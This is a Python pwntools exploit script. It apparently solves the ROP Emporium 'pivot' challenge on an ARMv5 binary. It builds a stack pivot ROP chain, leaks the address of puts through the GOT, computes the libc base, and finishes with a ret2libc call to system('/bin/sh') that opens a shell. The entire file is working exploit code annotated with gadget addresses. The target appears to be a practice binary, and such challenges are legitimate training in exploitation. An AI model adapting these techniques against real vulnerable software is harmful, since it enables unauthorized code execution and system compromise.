from pwn import *

sla = lambda x,y: io.sendlineafter(x,y)
sl = lambda x: io.sendline(x)
sa = lambda x,y: io.sendafter(x,y)
s = lambda x: io.send(x)
ru = lambda x: io.recvuntil(x, drop=True)
r = lambda x: io.recv(numb=x)
rl = lambda: io.recvline(keepends = False)

elf = context.binary = ELF('pivot_armv5-hf', checksec = False)
libc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6', checksec = False)

def start():
    gs = '''
        b *pwnme+156
    '''
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    else:
        return process(elf.path)

io = start()

rop = ROP(elf)

# skip blah blah
ru(b'The Old Gods kindly bestow upon you a place to pivot: ')

pivot = int(rl(), base = 16)

info(f'pivot @ 0x{pivot:02x}')

pivot_chain = ROP(elf)

# Place here my pivot chain.

# this is a convienient gadget to call read :D
#   0x000108d0 <+120>:	mov	r1, r3
#   0x000108d4 <+124>:	mov	r0, #0
#   0x000108d8 <+128>:	bl	0x10628 <read@plt>
#   0x000108dc <+132>:	ldr	r0, [pc, #44]	; 0x10910 <pwnme+184>
#   0x000108e0 <+136>:	bl	0x10640 <puts@plt>
#   0x000108e4 <+140>:	ldr	r0, [pc, #40]	; 0x10914 <pwnme+188>
#   0x000108e8 <+144>:	bl	0x10688 <srand@plt>
#   0x000108ec <+148>:	nop			; (mov r0, r0)
#   0x000108f0 <+152>:	sub	sp, r11, #4
#   0x000108f4 <+156>:	pop	{r11, pc}
call_read = 0x000108d0


# 0x00010838 : mov r0, r3 ; sub sp, fp, #4 ; pop {fp, pc}
# 0x0001099c : pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}
# 0x00010604 : pop {r3, pc}
pop_all_except_r0_r3 = 0x0001099c
pop_r3_pc = 0x00010604
mov_r0_r3_sub_and_pop = 0x00010838

pivot_chain.raw(0xdeadbeef) # r4 = 0xdeadbeef
pivot_chain.raw(pivot + 24) # r11 = pivot + 24 is the next gadget after mov_r0_r3_sub_and_pop gadget
pivot_chain.raw(pop_r3_pc)
pivot_chain.raw(elf.got.puts) # r3 = &puts@got
pivot_chain.raw(mov_r0_r3_sub_and_pop)

pivot_chain.raw(pivot + 0x78) # r11 = fp = pivot + 0x78 ; we will need it later.
pivot_chain.raw(pop_all_except_r0_r3)

pivot_chain.raw([0x0]*8) # r1-ip = 0x0
pivot_chain.raw(pop_r3_pc) # return here after the leak.
pivot_chain.raw(elf.sym.puts)

pivot_chain.raw(pivot + 0x78) # r3 = r1 = where to write our ret2libc attack :D
pivot_chain.raw(pop_all_except_r0_r3)

pivot_chain.raw(0x0) # r1 will be replaced with r3 in call_read gadget so here it doesnt matter.
pivot_chain.raw(0x64) # r2 = 0x64 make sure we have some room for our ret2libc attack :D
pivot_chain.raw([0x0]*6) # r4-ip = 0x0
pivot_chain.raw(0xdeadbeef) # lr = 0xdeadbeef

# here we don't need to prepare lr because bl read() already links lr and we don't have any issues.
pivot_chain.raw(call_read) # when main returns we need to have prepared r11 and the stack for our attack.

sa(b'> ', pivot_chain.chain())

# 0x00010790: pop {r4, pc};
pop_r4_pc = 0x00010790

#   0x0001092c <+0>:	mov	r5, r4
#   0x00010930 <+4>:	mov	r4, sp
#   0x00010934 <+8>:	mov	sp, r5
#   0x00010938 <+12>:	pop	{r4, r11, pc}
pop_r4_r11_pc = 0x00010938
usefulGadget  = 0x0001092c

# we have 48 - 32 = 16 bytes overflow so we are limited with exactly 4 words.
# this rop uses only 3 words and the remaining word is used for r11.
rop.raw(pop_r4_pc)
rop.raw(pivot)
rop.raw(usefulGadget)

exploit = fit({
    32: p32(0xdeadbeef) + rop.chain()
})

sa(b'> ', exploit)

# skip blah blah lines.
ru(b'Thank you!\n')
puts_leak = u32(r(4))

success(f'puts @ 0x{puts_leak:02x}')

libc.address = puts_leak - libc.sym.puts
success(f'libc @ 0x{libc.address:02x}')

# 0x000840c4 : pop {r0, r1, pc}
pop_r0_r1_pc = libc.address + 0x000840c4
binsh = next(libc.search(b'/bin/sh\x00'))

ret2libc = ROP(elf)
ret2libc.raw(pop_r0_r1_pc)
ret2libc.raw(binsh) # r0 = binsh
ret2libc.raw(0x0) # r1 = 0x0 (we do not care)
ret2libc.raw(libc.sym.system)

exploit = ret2libc.chain()

s(exploit) # enjoy your shell :D

success('Enjoy your shell.')

io.interactive()